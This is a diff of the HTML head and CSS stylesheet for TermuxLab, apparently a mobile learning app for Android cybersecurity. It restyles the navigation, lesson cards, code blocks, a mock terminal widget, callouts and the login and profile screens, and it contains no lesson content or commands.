@@ -2,1493 +2,1019 @@
 <html lang="pt">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
-<title>TermuxLab — Cibersegurança no Android</title>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>TermuxLab</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
 <style>
-*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
 :root{
-  --bg:#f8fafc;--white:#ffffff;--card:#ffffff;
-  --dark:#0f172a;--dark2:#1e293b;--dark3:#334155;
-  --text:#0f172a;--muted:#64748b;--subtle:#94a3b8;
-  --border:#e2e8f0;--border2:#cbd5e1;
-  --green:#00c97f;--green2:#00f5a0;--green-bg:#f0fdf4;--green-border:#bbf7d0;
-  --blue:#3b82f6;--blue2:#2563eb;--blue-bg:#eff6ff;--blue-border:#bfdbfe;
-  --purple:#8b5cf6;--purple-bg:#f5f3ff;
-  --yellow:#f59e0b;--yellow-bg:#fffbeb;
-  --red:#ef4444;--red-bg:#fef2f2;
+  --bg:#f0f4f8;--white:#fff;--dark:#0f172a;--dark2:#1e293b;
+  --text:#1e293b;--muted:#64748b;--border:#e2e8f0;
+  --blue:#2563eb;--blue2:#1d4ed8;--blue-bg:#eff6ff;--blue-light:#dbeafe;
+  --green:#16a34a;--green-bg:#f0fdf4;--green-light:#dcfce7;
+  --red:#dc2626;--red-bg:#fef2f2;
+  --yellow:#d97706;--yellow-bg:#fffbeb;
+  --purple:#7c3aed;
   --mono:'JetBrains Mono',monospace;
   --sans:'Inter',sans-serif;
-  --r:12px;--r2:8px;
 }
-html{overflow-x:hidden;scroll-behavior:smooth}
-body{font-family:var(--sans);background:var(--bg);color:var(--text);font-size:15px;line-height:1.6;overflow-x:hidden}
-input,button,textarea{font-family:var(--sans)}
-::selection{background:var(--green);color:var(--dark)}
-::-webkit-scrollbar{width:4px}::-webkit-scrollbar-thumb{background:var(--border2);border-radius:4px}
+html,body{height:100%;overflow-x:hidden}
+body{font-family:var(--sans);background:var(--bg);color:var(--text);font-size:15px;line-height:1.5}
 
-/* ── PAGES ── */
-.page{display:none}.page.active{display:block}
+/* SCREENS */
+.screen{display:none;min-height:100vh;flex-direction:column}
+.screen.on{display:flex}
 
-/* ── NAV ── */
-nav{position:sticky;top:0;z-index:900;background:var(--white);border-bottom:1px solid var(--border);padding:12px 20px;display:flex;align-items:center;justify-content:space-between}
-.nav-logo{display:flex;align-items:center;gap:8px;font-weight:800;font-size:1.05rem;color:var(--dark);text-decoration:none;cursor:pointer}
-.nav-logo-icon{width:28px;height:28px;background:linear-gradient(135deg,var(--blue),var(--purple));border-radius:6px;display:flex;align-items:center;justify-content:center;color:white;font-size:.75rem;font-weight:700}
-.nav-actions{display:flex;align-items:center;gap:8px}
-.btn{display:inline-flex;align-items:center;justify-content:center;gap:6px;font-weight:600;font-size:.85rem;padding:8px 16px;border-radius:var(--r2);border:none;cursor:pointer;transition:all .2s;text-decoration:none}
-.btn-primary{background:var(--blue2);color:white}.btn-primary:hover{background:#1d4ed8;transform:translateY(-1px)}
-.btn-outline{background:transparent;color:var(--dark);border:1px solid var(--border2)}.btn-outline:hover{background:var(--bg)}
-.btn-ghost{background:transparent;color:var(--muted);border:none}.btn-ghost:hover{color:var(--dark);background:var(--bg)}
-.btn-green{background:var(--green);color:var(--dark)}.btn-green:hover{background:#00b871;transform:translateY(-1px)}
-.btn-large{padding:14px 28px;font-size:.95rem;border-radius:var(--r)}
-.btn-full{width:100%}
-.btn-dark{background:var(--dark);color:white}.btn-dark:hover{background:var(--dark2)}
+/* NAV */
+.nav{background:var(--white);border-bottom:1px solid var(--border);padding:0 16px;height:52px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;flex-shrink:0}
+.nav-logo{font-weight:800;font-size:.95rem;color:var(--dark);display:flex;align-items:center;gap:7px;cursor:pointer}
+.nav-logo-ico{width:26px;height:26px;background:var(--blue);border-radius:6px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:.68rem;font-weight:700;font-family:var(--mono)}
+.nav-right{display:flex;gap:8px}
 
-/* ── HERO ── */
-#page-home{min-height:calc(100vh - 57px);padding-bottom:60px}
-.hero{padding:48px 20px 40px;text-align:center;background:linear-gradient(180deg,#f0f9ff 0%,var(--bg) 100%)}
-.hero-badge{display:inline-flex;align-items:center;gap:6px;background:var(--blue-bg);border:1px solid var(--blue-border);color:var(--blue2);font-size:.75rem;font-weight:600;padding:4px 12px;border-radius:20px;margin-bottom:20px;letter-spacing:.04em}
-.hero h1{font-size:clamp(2rem,9vw,3.2rem);font-weight:900;line-height:1.05;letter-spacing:-.03em;color:var(--dark);margin-bottom:8px}
-.hero h1 span{color:var(--blue2)}
-.hero p{font-size:1rem;color:var(--muted);max-width:380px;margin:0 auto 28px;line-height:1.7}
-.hero-ctas{display:flex;flex-direction:column;gap:10px;max-width:280px;margin:0 auto 40px}
-.hero-stats{display:flex;justify-content:center;gap:28px;flex-wrap:wrap;padding-top:32px;border-top:1px solid var(--border)}
-.stat-n{font-size:1.6rem;font-weight:900;color:var(--blue2);display:block;letter-spacing:-.03em}
-.stat-l{font-size:.72rem;color:var(--muted);text-transform:uppercase;letter-spacing:.08em}
+/* BUTTONS */
+.btn{display:inline-flex;align-items:center;justify-content:center;gap:6px;font-family:var(--sans);font-weight:600;font-size:.83rem;padding:8px 16px;border-radius:8px;border:none;cursor:pointer;transition:background .15s,transform .1s;text-decoration:none;white-space:nowrap}
+.btn:active{transform:scale(.97)}
+.btn-primary{background:var(--blue);color:#fff}
+.btn-primary:hover{background:var(--blue2)}
+.btn-secondary{background:transparent;color:var(--dark);border:1px solid var(--border)}
+.btn-secondary:hover{background:var(--bg)}
+.btn-ghost{background:transparent;color:var(--muted);border:none}
+.btn-ghost:hover{color:var(--dark);background:var(--bg)}
+.btn-danger{background:var(--red);color:#fff}
+.btn-block{width:100%;padding:13px}
+.btn-lg{padding:13px 24px;font-size:.92rem}
+.btn-green{background:var(--green);color:#fff}
+.btn-green:hover{background:#15803d}
 
-/* ── FEATURES ── */
-.section{padding:40px 20px}
-.section-title{font-size:1.5rem;font-weight:800;letter-spacing:-.02em;color:var(--dark);margin-bottom:6px}
-.section-sub{font-size:.9rem;color:var(--muted);margin-bottom:24px}
-.features-grid{display:flex;flex-direction:column;gap:12px}
-.feature-card{background:var(--white);border:1px solid var(--border);border-radius:var(--r);padding:20px}
-.feature-icon{width:44px;height:44px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:1.2rem;margin-bottom:12px}
-.fi-blue{background:var(--blue-bg)}.fi-green{background:var(--green-bg)}.fi-purple{background:var(--purple-bg)}.fi-yellow{background:var(--yellow-bg)}
-.feature-card h3{font-weight:700;font-size:.95rem;color:var(--dark);margin-bottom:5px}
-.feature-card p{font-size:.83rem;color:var(--muted);line-height:1.65}
+/* CONTENT AREA */
+.content{flex:1;overflow-y:auto;padding:16px;padding-bottom:72px}
+.content-wide{flex:1;overflow-y:auto;padding-bottom:72px}
 
-/* ── CTA SECTION ── */
-.cta-section{margin:0 20px 40px;background:linear-gradient(135deg,var(--blue2),var(--purple));border-radius:16px;padding:32px 24px;text-align:center;color:white}
-.cta-section h2{font-size:1.5rem;font-weight:800;letter-spacing:-.02em;margin-bottom:8px}
-.cta-section p{font-size:.9rem;opacity:.85;margin-bottom:20px}
-.btn-white{background:white;color:var(--blue2);font-weight:700}.btn-white:hover{background:#f8fafc;transform:translateY(-1px)}
+/* BOTTOM NAV */
+.bottom-nav{position:fixed;bottom:0;left:0;right:0;background:var(--white);border-top:1px solid var(--border);display:flex;height:60px;z-index:100}
+.bnav-btn{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:3px;border:none;background:none;color:var(--muted);font-size:.6rem;font-weight:500;cursor:pointer;font-family:var(--sans)}
+.bnav-btn .ico{font-size:1.3rem;line-height:1}
+.bnav-btn.active{color:var(--blue)}
 
-/* ── FOOTER ── */
-footer{background:var(--dark);color:#94a3b8;padding:32px 20px}
-.footer-brand{font-weight:800;color:white;font-size:1rem;margin-bottom:8px;display:flex;align-items:center;gap:8px}
-.footer-desc{font-size:.83rem;line-height:1.6;margin-bottom:20px}
-.footer-links h4{font-weight:600;color:white;font-size:.85rem;margin-bottom:10px}
-.footer-links a{display:block;color:#94a3b8;text-decoration:none;font-size:.83rem;margin-bottom:6px;transition:color .2s}
-.footer-links a:hover{color:white}
-.footer-bottom{margin-top:24px;padding-top:16px;border-top:1px solid #1e293b;font-size:.78rem;text-align:center}
+/* CARDS */
+.card{background:var(--white);border:1px solid var(--border);border-radius:12px;padding:16px}
+.card+.card{margin-top:10px}
 
-/* ── AUTH PAGES ── */
-.auth-page{min-height:calc(100vh - 57px);background:linear-gradient(135deg,var(--blue2) 0%,var(--purple) 100%);display:flex;align-items:flex-start;padding:32px 20px 40px}
-.auth-card{background:var(--dark2);border-radius:16px;padding:28px 24px;width:100%;max-width:400px;margin:0 auto}
-.auth-header{text-align:center;margin-bottom:24px}
-.auth-header .auth-logo{font-size:2rem;margin-bottom:8px}
-.auth-header h2{font-size:1.2rem;font-weight:700;color:white;margin-bottom:4px}
-.auth-header p{font-size:.82rem;color:#94a3b8}
-.form-group{margin-bottom:16px}
-.form-label{display:flex;align-items:center;gap:6px;font-size:.82rem;font-weight:500;color:#94a3b8;margin-bottom:6px}
-.form-input{width:100%;background:#0f172a;border:1px solid #334155;color:white;padding:12px 14px;border-radius:var(--r2);font-size:.9rem;transition:border .2s;outline:none}
-.form-input:focus{border-color:var(--blue);box-shadow:0 0 0 3px rgba(59,130,246,.15)}
-.form-input::placeholder{color:#475569}
-.auth-divider{height:1px;background:#334155;margin:16px 0}
-.auth-switch{text-align:center;font-size:.83rem;color:#94a3b8;margin-top:14px}
-.auth-switch a{color:var(--blue);text-decoration:none;font-weight:600;cursor:pointer}
-.auth-error{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.3);color:#fca5a5;padding:10px 12px;border-radius:var(--r2);font-size:.83rem;margin-bottom:14px;display:none}
-.auth-error.show{display:block}
+/* LESSON LIST */
+.lesson-item{background:var(--white);border:1px solid var(--border);border-radius:12px;padding:14px 16px;display:flex;align-items:center;gap:12px;cursor:pointer;transition:border-color .15s,box-shadow .15s;margin-bottom:8px;text-decoration:none;color:inherit}
+.lesson-item:active{border-color:var(--blue);box-shadow:0 0 0 3px var(--blue-light)}
+.lesson-num{width:34px;height:34px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:.75rem;font-weight:700;flex-shrink:0}
+.ln-done{background:var(--green-bg);color:var(--green);border:1px solid var(--green-light)}
+.ln-todo{background:var(--blue-bg);color:var(--blue);border:1px solid var(--blue-light)}
+.lesson-info{flex:1}
+.lesson-name{font-weight:600;font-size:.88rem;color:var(--dark);margin-bottom:2px}
+.lesson-meta{font-size:.72rem;color:var(--muted);display:flex;align-items:center;gap:6px}
+.badge{font-size:.62rem;font-weight:700;padding:2px 7px;border-radius:4px;text-transform:uppercase;letter-spacing:.04em}
+.b-ini{background:var(--green-bg);color:var(--green)}
+.b-mid{background:var(--yellow-bg);color:var(--yellow)}
+.b-adv{background:var(--red-bg);color:var(--red)}
+.chevron{color:var(--muted);font-size:1rem;flex-shrink:0}
 
-/* ── LESSONS LIST ── */
-#page-lessons{padding-bottom:40px}
-.lessons-header{padding:24px 20px 0}
-.lessons-title{font-size:1.5rem;font-weight:800;letter-spacing:-.02em;color:var(--dark);margin-bottom:4px}
-.lessons-sub{font-size:.85rem;color:var(--muted);margin-bottom:20px}
-.progress-overview{background:var(--white);border:1px solid var(--border);border-radius:var(--r);padding:16px 20px;margin:0 20px 20px}
-.progress-overview-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px}
-.progress-overview-top h3{font-weight:700;font-size:.9rem;color:var(--dark)}
-.progress-overview-top span{font-size:.8rem;color:var(--muted)}
-.progress-bar-bg{height:8px;background:var(--border);border-radius:8px;overflow:hidden}
-.progress-bar-fill{height:100%;background:linear-gradient(90deg,var(--blue2),var(--purple));border-radius:8px;transition:width .5s ease}
-.lessons-list{padding:0 20px;display:flex;flex-direction:column;gap:10px}
-.lesson-card{background:var(--white);border:1px solid var(--border);border-radius:var(--r);padding:18px;cursor:pointer;transition:all .2s;display:flex;align-items:center;gap:14px;text-decoration:none;color:inherit}
-.lesson-card:hover{border-color:var(--blue);box-shadow:0 4px 12px rgba(59,130,246,.1);transform:translateY(-1px)}
-.lesson-num{width:36px;height:36px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:.78rem;font-weight:700;flex-shrink:0}
-.ln-done{background:var(--green-bg);color:var(--green);border:1px solid var(--green-border)}
-.ln-active{background:var(--blue-bg);color:var(--blue2);border:1px solid var(--blue-border)}
-.ln-locked{background:var(--bg);color:var(--subtle);border:1px solid var(--border)}
-.lesson-info{flex:1;min-width:0}
-.lesson-title{font-weight:600;font-size:.9rem;color:var(--dark);margin-bottom:3px}
-.lesson-meta{font-size:.75rem;color:var(--muted);display:flex;align-items:center;gap:8px}
-.badge-level{font-size:.65rem;font-weight:700;padding:2px 7px;border-radius:4px;text-transform:uppercase;letter-spacing:.05em}
-.bl-beginner{background:var(--green-bg);color:var(--green)}
-.bl-intermediate{background:var(--yellow-bg);color:var(--yellow)}
-.bl-advanced{background:var(--red-bg);color:var(--red)}
-.lesson-arrow{color:var(--subtle);font-size:1.1rem;flex-shrink:0;transition:all .2s}
-.lesson-card:hover .lesson-arrow{color:var(--blue2);transform:translateX(3px)}
+/* LESSON CONTENT */
+.lesson-bar{background:var(--white);border-bottom:1px solid var(--border);padding:10px 16px;display:flex;align-items:center;gap:10px;flex-shrink:0}
+.back{display:flex;align-items:center;gap:4px;font-size:.8rem;color:var(--muted);background:none;border:none;cursor:pointer;font-family:var(--sans);padding:4px 8px;border-radius:6px}
+.back:active{background:var(--bg)}
+.prog-bar{flex:1;height:5px;background:var(--border);border-radius:5px;overflow:hidden}
+.prog-fill{height:100%;background:var(--blue);border-radius:5px;transition:width .4s}
 
-/* ── LESSON CONTENT ── */
-#page-lesson{padding-bottom:60px}
-.lesson-top-bar{padding:14px 20px;display:flex;align-items:center;gap:10px;border-bottom:1px solid var(--border);background:var(--white)}
-.back-btn{display:flex;align-items:center;gap:4px;font-size:.82rem;font-weight:500;color:var(--muted);cursor:pointer;border:none;background:none;padding:6px 10px;border-radius:var(--r2);transition:all .2s}
-.back-btn:hover{background:var(--bg);color:var(--dark)}
-.lesson-progress-bar{flex:1;height:6px;background:var(--border);border-radius:6px;overflow:hidden}
-.lesson-progress-fill{height:100%;background:linear-gradient(90deg,var(--blue2),var(--purple));border-radius:6px;transition:width .4s}
-.lesson-body{padding:24px 20px}
-.lesson-eyebrow{font-size:.72rem;font-weight:600;letter-spacing:.12em;text-transform:uppercase;color:var(--blue2);margin-bottom:10px}
-.lesson-h1{font-size:1.6rem;font-weight:800;letter-spacing:-.03em;color:var(--dark);margin-bottom:6px;line-height:1.2}
-.lesson-desc{font-size:.9rem;color:var(--muted);margin-bottom:24px;line-height:1.7;padding:14px;background:var(--blue-bg);border-left:3px solid var(--blue2);border-radius:0 var(--r2) var(--r2) 0}
-.lc-section{margin-bottom:28px}
-.lc-section h2{font-size:1rem;font-weight:700;color:var(--dark);margin-bottom:12px;padding-bottom:8px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px}
-.lc-section h2 .sec-num{font-size:.68rem;background:var(--blue-bg);color:var(--blue2);border:1px solid var(--blue-border);padding:2px 7px;border-radius:4px;font-weight:700}
-.lc-section p{font-size:.88rem;color:var(--dark3);line-height:1.8;margin-bottom:10px}
-.lc-section p code{background:var(--blue-bg);color:var(--blue2);padding:1px 5px;border-radius:4px;font-size:.82rem;font-family:var(--mono)}
-.lc-section b{color:var(--dark);font-weight:600}
-.lc-section ul{padding-left:0;list-style:none;display:flex;flex-direction:column;gap:5px;margin-bottom:10px}
-.lc-section li{font-size:.86rem;color:var(--dark3);line-height:1.75;padding-left:16px;position:relative}
-.lc-section li::before{content:'›';position:absolute;left:0;color:var(--blue2);font-weight:700}
+.lc-wrap{padding:16px 16px 80px}
+.lc-eyebrow{font-size:.68rem;font-weight:600;letter-spacing:.12em;text-transform:uppercase;color:var(--blue);margin-bottom:8px}
+.lc-h1{font-size:1.45rem;font-weight:800;letter-spacing:-.02em;color:var(--dark);margin-bottom:10px;line-height:1.2}
+.lc-intro{font-size:.87rem;color:var(--muted);line-height:1.75;padding:12px 14px;background:var(--blue-bg);border-left:3px solid var(--blue);border-radius:0 8px 8px 0;margin-bottom:20px}
 
-/* Code blocks */
-.code-block{background:var(--dark2);border:1px solid var(--dark3);border-radius:var(--r);overflow:hidden;margin:12px 0}
-.code-header{background:var(--dark);border-bottom:1px solid var(--dark3);padding:8px 14px;display:flex;align-items:center;justify-content:space-between}
-.code-lang{font-size:.65rem;font-weight:600;letter-spacing:.08em;text-transform:uppercase;color:var(--green)}
-.code-copy-btn{font-size:.65rem;color:var(--subtle);cursor:pointer;background:none;border:none;font-family:var(--mono);padding:2px 6px;border-radius:4px;transition:all .2s}
-.code-copy-btn:hover{background:var(--dark3);color:var(--green)}
-.code-body{padding:14px;overflow-x:auto;font-size:.8rem;line-height:1.65;font-family:var(--mono)}
-.ck{color:var(--green2)}.cv{color:#93c5fd}.cs{color:#fca5a5}.cf{color:#fbbf24}.co{color:#64748b}.cm{color:#475569;font-style:italic}
+.lc-sec{margin-bottom:24px}
+.lc-sec h2{font-size:.95rem;font-weight:700;color:var(--dark);margin-bottom:10px;padding-bottom:8px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:7px}
+.sec-n{font-size:.65rem;background:var(--blue-bg);color:var(--blue);padding:2px 6px;border-radius:4px;font-weight:700}
+.lc-sec p{font-size:.85rem;color:var(--dark2);line-height:1.8;margin-bottom:8px}
+.lc-sec p code,.lc-sec li code{background:var(--blue-bg);color:var(--blue);padding:1px 5px;border-radius:4px;font-size:.8rem;font-family:var(--mono)}
+.lc-sec b{font-weight:600;color:var(--dark)}
+.lc-sec ul{padding:0;list-style:none;display:flex;flex-direction:column;gap:4px;margin-bottom:8px}
+.lc-sec li{font-size:.84rem;color:var(--dark2);line-height:1.75;padding-left:14px;position:relative}
+.lc-sec li::before{content:'›';position:absolute;left:0;color:var(--blue);font-weight:700}
 
-/* Tables */
-.lc-table{width:100%;border-collapse:collapse;margin:12px 0;font-size:.81rem}
-.lc-table th{background:var(--bg);color:var(--dark);font-weight:600;text-align:left;padding:8px 10px;border:1px solid var(--border);font-size:.73rem;text-transform:uppercase;letter-spacing:.04em}
-.lc-table td{padding:8px 10px;border:1px solid var(--border);color:var(--dark3);vertical-align:top}
-.lc-table code{background:var(--blue-bg);color:var(--blue2);padding:1px 4px;border-radius:3px;font-size:.78rem}
+/* CODE BLOCKS */
+.cb{background:#1e293b;border-radius:10px;overflow:hidden;margin:10px 0}
+.cb-top{background:#0f172a;padding:7px 12px;display:flex;align-items:center;justify-content:space-between}
+.cb-lang{font-size:.62rem;font-weight:600;letter-spacing:.08em;text-transform:uppercase;color:#00f5a0;font-family:var(--mono)}
+.cb-copy{font-size:.65rem;color:#64748b;background:none;border:none;cursor:pointer;font-family:var(--mono);padding:2px 6px;border-radius:4px}
+.cb-copy:active{background:#334155;color:#00f5a0}
+.cb-body{padding:12px;font-family:var(--mono);font-size:.78rem;line-height:1.65;overflow-x:auto;color:#e2e8f0}
+.ck{color:#00f5a0}.cv{color:#93c5fd}.cs{color:#fca5a5}.cf{color:#fbbf24}.co{color:#475569}.cm{color:#374151;font-style:italic}
 
-/* Callouts */
-.callout{padding:12px 14px;border-radius:var(--r2);margin:12px 0;font-size:.84rem;line-height:1.7;display:flex;gap:9px}
-.c-tip{background:var(--green-bg);border:1px solid var(--green-border)}.c-tip b{color:var(--green)}
+/* TABLES */
+.tbl{width:100%;border-collapse:collapse;margin:10px 0;font-size:.8rem}
+.tbl th{background:var(--bg);color:var(--dark);font-weight:600;text-align:left;padding:7px 10px;border:1px solid var(--border);font-size:.7rem;text-transform:uppercase;letter-spacing:.04em}
+.tbl td{padding:7px 10px;border:1px solid var(--border);color:var(--dark2);vertical-align:top}
+.tbl code{background:var(--blue-bg);color:var(--blue);padding:1px 4px;border-radius:3px;font-size:.77rem;font-family:var(--mono)}
+
+/* CALLOUTS */
+.call{padding:11px 13px;border-radius:8px;margin:10px 0;font-size:.83rem;line-height:1.7;display:flex;gap:9px}
+.call b{display:block;margin-bottom:2px;font-weight:700}
+.c-tip{background:var(--green-bg);border:1px solid var(--green-light)}.c-tip b{color:var(--green)}
 .c-warn{background:var(--yellow-bg);border:1px solid #fde68a}.c-warn b{color:var(--yellow)}
 .c-danger{background:var(--red-bg);border:1px solid #fecaca}.c-danger b{color:var(--red)}
-.c-hack{background:var(--dark);border:1px solid var(--dark3);color:#e2e8f0}.c-hack b{color:var(--green2)}
-.callout-icon{flex-shrink:0;font-size:1rem;line-height:1.7}
-.callout b{display:block;margin-bottom:2px}
+.c-hack{background:#0f172a;border:1px solid #334155;color:#94a3b8}.c-hack b{color:#00f5a0}
+.call-ico{flex-shrink:0;font-size:.95rem;line-height:1.7}
 
-/* Interactive Terminal */
-.try-it{background:var(--dark);border:1px solid var(--dark3);border-radius:var(--r);overflow:hidden;margin:16px 0}
-.try-it-header{background:#111827;border-bottom:1px solid var(--dark3);padding:10px 14px;display:flex;align-items:center;justify-content:space-between}
-.try-it-title{font-size:.75rem;font-weight:600;color:var(--green2);display:flex;align-items:center;gap:6px}
-.try-it-dots{display:flex;gap:5px}
-.dot{width:10px;height:10px;border-radius:50%}.dr{background:#ff5f57}.dy{background:#febc2e}.dg{background:#28c840}
-.try-it-output{padding:14px;min-height:80px;max-height:200px;overflow-y:auto;font-family:var(--mono);font-size:.79rem;line-height:1.6;color:#94a3b8}
-.try-it-output .t-prompt{color:var(--green2)}.try-it-output .t-out{color:#e2e8f0}.try-it-output .t-err{color:#f87171}
-.try-it-input-row{display:flex;align-items:center;gap:8px;padding:10px 14px;border-top:1px solid var(--dark3)}
-.try-it-prompt-label{font-family:var(--mono);font-size:.78rem;color:var(--green2);flex-shrink:0}
-.try-it-input{flex:1;background:transparent;border:none;outline:none;color:white;font-family:var(--mono);font-size:.82rem}
-.try-it-input::placeholder{color:#475569}
-.try-it-exec{background:var(--blue2);color:white;border:none;padding:6px 12px;border-radius:6px;font-size:.75rem;font-weight:600;cursor:pointer;flex-shrink:0}
-.try-it-exec:hover{background:#1d4ed8}
-.try-it-hint{padding:8px 14px;border-top:1px solid var(--dark3);font-size:.72rem;color:#475569;font-family:var(--mono)}
+/* TERMINAL */
+.term{background:#0f172a;border-radius:10px;overflow:hidden;margin:12px 0}
+.term-top{background:#1e293b;padding:9px 13px;display:flex;align-items:center;justify-content:space-between}
+.term-dots{display:flex;gap:5px}
+.td{width:10px;height:10px;border-radius:50%}
+.td-r{background:#ff5f57}.td-y{background:#febc2e}.td-g{background:#28c840}
+.term-lbl{font-size:.68rem;color:#475569;font-family:var(--mono)}
+.term-out{padding:12px;min-height:80px;max-height:180px;overflow-y:auto;font-family:var(--mono);font-size:.77rem;line-height:1.6;color:#64748b}
+.t-prompt{color:#00f5a0}.t-out{color:#e2e8f0}.t-err{color:#f87171}
+.term-in{display:flex;align-items:center;gap:8px;padding:8px 12px;border-top:1px solid #1e293b}
+.term-prompt{font-family:var(--mono);font-size:.76rem;color:#00f5a0;flex-shrink:0;white-space:nowrap}
+.term-input{flex:1;background:transparent;border:none;outline:none;color:#fff;font-family:var(--mono);font-size:.8rem;min-width:0}
+.term-input::placeholder{color:#334155}
+.term-run{background:var(--blue);color:#fff;border:none;padding:5px 10px;border-radius:6px;font-size:.72rem;font-weight:600;cursor:pointer;flex-shrink:0}
+.term-run:active{background:var(--blue2)}
+.term-hint{padding:6px 12px;border-top:1px solid #1e293b;font-size:.68rem;color:#334155;font-family:var(--mono)}
 
-/* Exercise */
-.exercise{background:var(--green-bg);border:1px solid var(--green-border);border-radius:var(--r);padding:18px;margin:16px 0}
-.exercise-title{font-size:.72rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--green);margin-bottom:12px;display:flex;align-items:center;gap:6px}
+/* EXERCISE */
+.ex-box{background:var(--green-bg);border:1px solid var(--green-light);border-radius:10px;padding:14px;margin:12px 0}
+.ex-title{font-size:.7rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--green);margin-bottom:10px;display:flex;align-items:center;gap:6px}
 
-/* Lesson nav */
-.lesson-nav-btns{display:flex;gap:10px;margin-top:32px;padding-top:20px;border-top:1px solid var(--border)}
-.lesson-nav-btns .btn{flex:1;font-size:.8rem;padding:12px}
-.complete-btn{background:linear-gradient(135deg,var(--green),#00a86b);color:var(--dark);font-weight:700}
-.complete-btn:hover{transform:translateY(-2px);box-shadow:0 4px 16px rgba(0,201,127,.3)}
-.complete-btn.done{background:var(--green-bg);color:var(--green);border:1px solid var(--green-border);cursor:default}
+/* LESSON NAV */
+.lesson-nav{display:flex;gap:8px;margin-top:28px;padding-top:16px;border-top:1px solid var(--border)}
+.lesson-nav .btn{flex:1;font-size:.78rem;padding:11px}
 
-/* ── PROFILE / DASHBOARD ── */
-#page-profile{padding:0 0 60px}
-.profile-hero{background:linear-gradient(135deg,var(--blue2),var(--purple));padding:32px 20px;color:white;text-align:center}
-.profile-avatar{width:64px;height:64px;background:rgba(255,255,255,.2);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:1.6rem;margin:0 auto 12px}
-.profile-name{font-size:1.3rem;font-weight:800;margin-bottom:4px}
-.profile-email{font-size:.82rem;opacity:.8}
-.profile-stats{padding:20px;display:flex;gap:10px}
-.pstat{flex:1;background:var(--white);border:1px solid var(--border);border-radius:var(--r);padding:16px;text-align:center}
-.pstat-n{font-size:1.4rem;font-weight:800;color:var(--blue2);display:block}
-.pstat-l{font-size:.72rem;color:var(--muted);text-transform:uppercase;letter-spacing:.06em}
-.badges-section{padding:0 20px 20px}
-.badges-title{font-weight:700;font-size:.95rem;color:var(--dark);margin-bottom:12px}
-.badges-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
-.badge-item{background:var(--white);border:1px solid var(--border);border-radius:var(--r);padding:14px;text-align:center}
-.badge-item.earned{border-color:var(--yellow);background:var(--yellow-bg)}
-.badge-item.locked{opacity:.4;filter:grayscale(1)}
-.badge-icon{font-size:1.8rem;margin-bottom:6px}
-.badge-name{font-size:.72rem;font-weight:600;color:var(--dark)}
-.badge-date{font-size:.65rem;color:var(--muted);margin-top:2px}
+/* AUTH */
+.auth-wrap{flex:1;background:linear-gradient(135deg,var(--blue),var(--purple));display:flex;align-items:flex-start;padding:24px 16px 40px}
+.auth-card{background:#1e293b;border-radius:16px;padding:24px 20px;width:100%;max-width:400px;margin:0 auto}
+.auth-head{text-align:center;margin-bottom:20px}
+.auth-ico{font-size:2rem;margin-bottom:8px}
+.auth-head h2{font-size:1.1rem;font-weight:700;color:#fff;margin-bottom:3px}
+.auth-head p{font-size:.8rem;color:#94a3b8}
+.form-grp{margin-bottom:14px}
+.form-lbl{font-size:.78rem;font-weight:500;color:#94a3b8;margin-bottom:5px;display:block}
+.form-inp{width:100%;background:#0f172a;border:1px solid #334155;color:#fff;padding:11px 13px;border-radius:8px;font-size:.88rem;outline:none;font-family:var(--sans)}
+.form-inp:focus{border-color:var(--blue)}
+.form-inp::placeholder{color:#475569}
+.auth-err{background:rgba(220,38,38,.15);border:1px solid rgba(220,38,38,.3);color:#fca5a5;padding:9px 12px;border-radius:8px;font-size:.8rem;margin-bottom:12px;display:none}
+.auth-err.show{display:block}
+.auth-div{height:1px;background:#334155;margin:14px 0}
+.auth-switch{text-align:center;font-size:.8rem;color:#94a3b8;margin-top:12px}
+.auth-switch a{color:var(--blue);cursor:pointer;font-weight:600}
 
-/* ── BOTTOM NAV ── */
-.bottom-nav{position:fixed;bottom:0;left:0;right:0;z-index:800;background:var(--white);border-top:1px solid var(--border);display:flex;justify-content:space-around;padding:8px 0 calc(8px + env(safe-area-inset-bottom));box-shadow:0 -4px 20px rgba(0,0,0,.06)}
-.bnav-item{display:flex;flex-direction:column;align-items:center;gap:3px;padding:4px 16px;cursor:pointer;border:none;background:none;color:var(--muted);font-size:.58rem;font-weight:500;transition:color .2s;text-transform:uppercase;letter-spacing:.04em}
-.bnav-item .bni{font-size:1.2rem;line-height:1}
-.bnav-item.active{color:var(--blue2)}
-body{padding-bottom:68px}
+/* PROFILE */
+.profile-hero{background:linear-gradient(135deg,var(--blue),var(--purple));padding:28px 16px;text-align:center;color:#fff}
+.profile-av{width:60px;height:60px;background:rgba(255,255,255,.2);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:1.5rem;margin:0 auto 10px}
+.profile-name{font-size:1.2rem;font-weight:800;margin-bottom:3px}
+.profile-email{font-size:.8rem;opacity:.75}
+.stats-row{display:flex;gap:8px;padding:12px 16px}
+.stat-card{flex:1;background:var(--white);border:1px solid var(--border);border-radius:10px;padding:12px;text-align:center}
+.stat-n{font-size:1.35rem;font-weight:800;color:var(--blue);display:block}
+.stat-l{font-size:.65rem;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;margin-top:2px}
